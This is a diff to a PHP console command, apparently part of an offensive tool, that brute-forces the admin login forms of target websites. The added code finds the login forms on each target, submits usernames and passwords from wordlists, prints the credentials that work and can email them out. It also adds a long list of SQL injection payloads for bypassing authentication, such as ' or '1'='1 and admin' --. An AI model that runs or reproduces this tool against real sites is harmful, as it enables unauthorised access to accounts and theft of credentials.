@@ -161,7 +161,7 @@ class BruteForceController extends Command{
                 //VERIFY IF EXIST USER ESPECIFY, IF CASE NOT, LIST USER OF WORDPRESS
                 $output->writeln("<info>Searching for users, wait...</info>");
 
-                $usernames=$this->getUsernamesInArray($username,$wp);
+                $usernames=$this->getUsernamesInArrayWP($username,$wp);
 
                 $output->writeln("<info></info>");
                 $output->writeln("<info>".count($usernames)." of users...</info>");
@@ -281,96 +281,127 @@ class BruteForceController extends Command{
 
         //verify if target is list or one
         $targets=$this->getTargetsInArray($target);
+
+        $usernames=$this->getUsernamesInArray($username);
+
+        $wordlist=$this->getWordListExpecify($injection,$wordlist);
+
         $oldTargets=[];
         if($targets!=false )
         {
-
             //CONFIG PROFRESSBAR
             $progress = new ProgressBar($output, count($wordlist) * count($targets));
             $progress = $this->configBar($progress);
 
             foreach ($targets as $keyTarget => $valueTarget)
             {
-                $output->writeln("");
-                $output->writeln("<info>Target ".$keyTarget." - ".$valueTarget."</info>");
 
                 $site = new Site($valueTarget,$proxy);
-
                 //verify is wordlist and set wordlist default
                 //RETURN BASENAME OF TARGET
                 $baseUrl=$site->getBaseUrByUrl();
+                //Check if target enter in loop in the past
 
-                if($injection)
+                if(!@array_search($oldTargets,$baseUrl))
                 {
-                    $wordlist=$site->listOfInjectionAdmin();
+
+                    $oldTargets[]=$baseUrl;
+
+
+                    $output->writeln("");
+                    $output->writeln("<info>Target ".$keyTarget." - ".$valueTarget."</info>");
+
+
+                    $resultActionsForm=$site->getActionForms();
+
+                    foreach($resultActionsForm as $actionForm) {
+
+                        //$resultIsAdmin = $site->isAdmin();
+
+                        $resultIsAdmin=$site->formIsAdmin($actionForm);
+                        //$resultIsAdmin=true;
+                        if ($resultIsAdmin) {
+
+                            $usernameField = $site->getNameFieldUsername($actionForm);
+
+                            $passwordField = $site->getNameFieldPassword($actionForm);
+
+                            $methodForm = $site->getMethodForm($actionForm);
+
+                            $otherFields = $site->getOthersField($actionForm,array_merge($usernameField, $passwordField));
+
+                            if(!$usernames AND $injection){
+                                $resultOfBruteForce = $site->bruteForceAllInjection($actionForm, $methodForm, $usernameField, $passwordField, $otherFields,$wordlist);
+                            }
+                            else
+                            {
+                                $resultOfBruteForce = $site->bruteForceAll($actionForm, $methodForm, $usernameField, $passwordField, $otherFields,$wordlist,$usernames);
+                            }
+
+                            if ($resultOfBruteForce) {
+
+                                $output->writeln("");
+                                $output->writeln("<info>Login success</info>");
+                                $output->writeln("<info>Target: " . $valueTarget . "</info>");
+                                $output->writeln("<info>Action : " . $actionForm . "</info>");
+                                $output->writeln("<info>Username-> Field : " . key($usernameField) . " - Value: " . $resultOfBruteForce['username'] . "</info>");
+                                $output->writeln("<info>Password-> Field : " . key($passwordField) . " - Value: " . $resultOfBruteForce['password'] . "</info>");
+
+                                $resultFinal[0]['target'] = $valueTarget;
+                                $resultFinal[0]['usernameField'] = key($usernameField);
+                                $resultFinal[0]['username'] = $resultOfBruteForce['username'];
+                                $resultFinal[0]['passwordField'] = key($passwordField);
+                                $resultFinal[0]['password'] = $resultOfBruteForce['password'];
+                                $resultFinal[0]['action'] = $actionForm;
+
+                                if (isset($resultOfBruteForce['obs'])) {
+                                    $resultFinal[0]['obs'] = $resultOfBruteForce['obs'];
+                                }
+                                if ($email) {
+                                    $this->sendMailWordPress($resultFinal);
+                                }
+                                //PRINT RESULT LIST FINAL
+                                $this->printResult($resultFinal, $output);
+
+                            }
+                            //
+                            //$methodForm     = $site->getMethodForm();
+                        } else {
+                            echo "is not admin";
+                        }
+
+                    }
                 }
 
-                $wordlist=$site->getWordListInArray($wordlist);
 
-                //$resultIsJoomla=$site->isJoomla();
-                $resultIsAdmin=$site->isAdmin();
-                //$resultIsAdmin=true;
-                if($resultIsAdmin)
-                {
-                    $actionForm     = $site->getActionForm();
-
-                    $usernameField  = $site->getNameFieldUsername($actionForm);
-                    //var_dump($usernameField);
-                    $passwordField  = $site->getNameFieldPassword($actionForm);
-                    //var_dump($passwordField);
-                    //exit();
-                    $methodForm     = $site->getMethodForm();
-
-                    $excludeValues[]=$usernameField;
-                    $excludeValues[]=$passwordField;
-
-                    $otherFields=$site->getOthersField(array_merge($usernameField,$passwordField));
-
-                    if(!isset($otherFields[$actionForm]))
-                    {
-                        $otherFields[$actionForm]=array();
-                    }
-
-                    $resultOfBruteForce=$site->bruteForceAll($actionForm,$methodForm,$usernameField,$passwordField,$otherFields[$actionForm]);
-
-                    if($resultOfBruteForce)
-                    {
-
-                        $output->writeln("");
-                        $output->writeln("<info>Login success</info>");
-                        $output->writeln("<info>Target: ".$valueTarget."</info>");
-                        $output->writeln("<info>Action : ".$actionForm."</info>");
-                        $output->writeln("<info>Username-> Field : ".key($usernameField)." - Value: ".$resultOfBruteForce['username']."</info>");
-                        $output->writeln("<info>Password-> Field : ".key($passwordField)." - Value: ".$resultOfBruteForce['password']."</info>");
-
-                        $resultFinal[0]['target']=$valueTarget;
-                        $resultFinal[0]['usernameField']=key($usernameField);
-                        $resultFinal[0]['username']=$resultOfBruteForce['username'];
-                        $resultFinal[0]['passwordField']=key($passwordField);
-                        $resultFinal[0]['password']=$resultOfBruteForce['password'];
-                        $resultFinal[0]['action']=$actionForm;
-
-                        if(isset($resultOfBruteForce['obs']))
-                        {
-                            $resultFinal[0]['obs']=$resultOfBruteForce['obs'];
-                        }
-                        if($email){
-                            $this->sendMailWordPress($resultFinal);
-                        }
-                        //PRINT RESULT LIST FINAL
-                        $this->printResult($resultFinal,$output);
-
-                    }
-                    //
-                    //$methodForm     = $site->getMethodForm();
-                }else{
-                    echo "is not admin";
-                }
-                $oldTargets[]=$baseUrl;
             }
 
         }
     }
+
+    public function getWordListExpecify($injection,$wordlist)
+    {
+        if(!$injection AND !$wordlist)
+        {
+            return $this->getWordListInArray();
+        }
+        if($injection AND !$wordlist)
+        {
+            return $this->listOfInjectionAdmin();
+        }
+        if(is_file($wordlist))
+        {
+            $arrWordlist = file($wordlist,FILE_IGNORE_NEW_LINES);
+            return $arrWordlist;
+        }
+        if(!is_file($wordlist)AND !empty($wordlist))
+        {
+            $arrWordlist[] = $wordlist;
+            return $arrWordlist;
+        }
+    }
+
+
 
     /*protected function sendDataToLoginWordPress($username,$password,$target,$tor=""){
 
@@ -424,7 +455,7 @@ class BruteForceController extends Command{
         return false;
     }
 
-    protected function getUsernamesInArray($username,$wp){
+    protected function getUsernamesInArrayWP($username,$wp){
 
         if(!$username){
             //VERIFY IF LIST TXT OR SEARCH IN WORDPRESS SITE
@@ -440,6 +471,22 @@ class BruteForceController extends Command{
         if($usernameIsFile){
             $usernameResult   = file($username,FILE_IGNORE_NEW_LINES);
             return $this->clearArrayEmpty($usernameResult);
+        }
+
+        $usernames[0]=$username;
+        return $usernames;
+
+    }
+
+    protected function getUsernamesInArray($username){
+
+        if(!$username){
+            return false;
+        }
+        if(is_file($username))
+        {
+            $usernameResult   = file($username,FILE_IGNORE_NEW_LINES);
+            return $usernameResult;
         }
 
         $usernames[0]=$username;
@@ -500,6 +547,121 @@ class BruteForceController extends Command{
 
         $table->setRows($resultFinal);
         $table->render();
+    }
+
+    public function listOfInjectionAdmin()
+    {
+        $injection[]="zzaa44";
+        $injection[]="admin";
+        $injection[]="adm";
+        $injection[]="' or '1'='1";
+        $injection[]="\' or \'1\'=\'1";
+        $injection[]="' or 'x'='x";
+        $injection[]="\' or \'x\'=\'x";
+        $injection[]="' or 0=0 --";
+        $injection[]="\' or 0=0 --";
+        $injection[]='" or 0=0 --';
+        $injection[]='\" or 0=0 --';
+        $injection[]="or 0=0 --";
+        $injection[]='" or 0=0 #';
+        $injection[]='\" or 0=0 #';
+        $injection[]="or 0=0 #";
+        $injection[]="' or 'x'='x";
+        $injection[]="\' or \'x\'=\'x";
+        $injection[]='" or "x"="x';
+        $injection[]='\" or \"x\"=\"x';
+        $injection[]='" or 1=1--';
+        $injection[]='\" or 1=1--';
+        $injection[]='" or "a"="a';
+        $injection[]='\" or \"a\"=\"a';
+        $injection[]='") or ("a"="a';
+        $injection[]='\") or (\"a\"=\"a';
+        $injection[]='and 1=1';
+        $injection[]="') or ('x'='x";
+        $injection[]="\') or (\'x'=\'x";
+        $injection[]="' or 1=1--";
+        $injection[]="\' or 1=1--";
+        $injection[]="or 1=1--";
+        $injection[]="' or a=a--";
+        $injection[]="\' or a=a--";
+        $injection[]="') or ('a'='a";
+        $injection[]="\') or (\'a\'='a";
+        $injection[]="hi' or 1=1 --";
+        $injection[]="hi\' or 1=1 --";
+        $injection[]="'or'1=1'";
+        $injection[]="\'or\'1=1\'";
+        $injection[]="==";
+        $injection[]="and 1=1--";
+        $injection[]="' or 'one'='one--";
+        $injection[]="\' or \'one\'=\'one--";
+        $injection[]='hi" or "a"="a';
+        $injection[]='hi\" or \"a\"=\"a';
+        $injection[]='hi" or 1=1 --';
+        $injection[]='hi\" or 1=1 --';
+        $injection[]='" or 0=0 --';
+        $injection[]='\" or 0=0 --';
+        $injection[]='" or 0=0 #';
+        $injection[]='\" or 0=0 #';
+        $injection[]='" or "x"="x';
+        $injection[]='\" or \"x\"=\"x';
+        $injection[]='" or 1=1--';
+        $injection[]='\" or 1=1--';
+        $injection[]="' or 'one'='one";
+        $injection[]="\' or \'one\'=\'one";
+        $injection[]="' and 'one'='one";
+        $injection[]="\' and \'one\'=\'one";
+        $injection[]="' and 'one'='one--";
+        $injection[]="\' and \'one\'=\'one--";
+        $injection[]="1') and '1'='1--";
+        $injection[]="1\') and \'1\'=\'1--";
+        $injection[]=") or ('1'='1--";
+        $injection[]=") or (\'1\'=\'1--";
+        $injection[]=") or '1'='1--";
+        $injection[]=") or \'1\'=\'1--";
+        $injection[]="or 1=1/*";
+        $injection[]="or 1=1#";
+        $injection[]="or 1=1--";
+        $injection[]="admin'/*";
+        $injection[]="admin\'/*";
+        $injection[]="admin' #";
+        $injection[]="admin\' #";
+        $injection[]="admin' --";
+        $injection[]="admin\' --";
+        $injection[]="') or ('a'='a";
+        $injection[]="\') or (\'a\'=\'a";
+        $injection[]="' or a=a--";
+        $injection[]="\' or a=a--";
+        $injection[]="or 1=1--";
+        $injection[]="' or 1=1--";
+        $injection[]="\' or 1=1--";
+        $injection[]="') or ('x'='x";
+        $injection[]="\') or (\'x'=\'x";
+        $injection[]="' or 'x'='x";
+        $injection[]="\' or \'x\'=\'x";
+        $injection[]="or 0=0 #";
+        $injection[]="' or 0=0 #";
+        $injection[]="\' or 0=0 #";
+        $injection[]="or 0=0 --";
+        $injection[]="' or 0=0 --";
+        $injection[]="\' or 0=0 --";
+        $injection[]="' or 'x'='x";
+        $injection[]="\' or \'x\'=\'x";
+        $injection[]="' or '1'='1";
+        $injection[]="\' or \'1\'=\'1";
+        $injection[]='" or "a"="a';
+        $injection[]='\" or \"a\"=\"a';
+        $injection[]='") or ("a"="a';
+        $injection[]='\") or (\"a\"=\"a';
+        $injection[]='hi" or "a"="a';
+        $injection[]='hi\" or \"a\"=\"a';
+        $injection[]='hi" or 1=1 --';
+        $injection[]='hi\" or 1=1 --';
+        $injection[]="hi' or 1=1 --";
+        $injection[]="hi\' or 1=1 --";
+        $injection[]="'or'1=1'";
+        $injection[]="\'or\'1=1\'";
+
+        return $injection;
     }
 
 }
